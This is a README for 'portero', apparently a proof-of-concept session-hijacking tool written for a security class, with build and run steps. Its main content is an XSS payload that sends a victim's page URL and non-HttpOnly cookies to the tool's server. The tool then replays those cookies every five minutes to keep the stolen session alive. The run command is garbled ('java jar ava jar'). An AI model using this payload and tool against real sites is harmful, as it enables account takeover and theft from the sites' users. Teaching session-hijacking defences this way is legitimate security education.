# portero
Proof of concept for hijacking sessions for a security class. It keeps the "HTTP session door open".

##Building

This is a Spring Boot project that uses Gradle for builds. To build install gradle and run:

```
gradle build
```
##Running

After the build run the following:

```
java jar ava jar build/libs/portero-x.x.x-SNAPSHOT.jar
```

##Hijack HTTP Session

Exploit a XSS vunerability if cookies are not HTTPOnly getting it to execute the following JavaScript pointed to your portero server.

```
document.createElement("img").src="http://localhost:9000/hijack?url=" + encodeURIComponent(window.location.href) + "&cookies=" + encodeURIComponent(document.cookie)
```

Portero will ping the site with cookies every 5 minutes to keep the HTTP Session alive and provide a detail of the connection information.
